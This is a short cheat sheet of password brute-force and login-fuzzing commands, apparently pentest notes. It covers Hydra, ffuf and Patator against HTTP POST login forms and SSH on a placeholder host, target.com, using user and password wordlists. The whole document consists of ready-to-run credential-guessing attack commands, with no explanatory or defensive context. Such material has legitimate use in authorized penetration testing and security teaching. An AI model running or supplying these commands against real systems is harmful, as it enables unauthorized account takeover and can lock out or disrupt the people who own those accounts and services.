
## **Hydra**

POST-form
```bash
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

SSH
```bash
hydra -L users.txt -P passwords.txt ssh://target.com -t 4
```



## **ffuf**

params
```bash
ffuf -u "http://target.com/login?username=FUZZ&password=secret" -w users.txt -mr "success"
```

POST-form
```bash
ffuf -u http://target.com/login -w users.txt -d "username=FUZZ&password=test123" -X POST -mr "Welcome"
```


## **Patator**

http
```bash
patator http_fuzz url="http://target.com/login" method=POST body='username=FILE0&password=FILE1' 0=users.txt 1=passwords.txt -x ignore:fgrep='Invalid credentials'
```

ssh
```bash
patator ssh_login host=target.com user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed.'
```

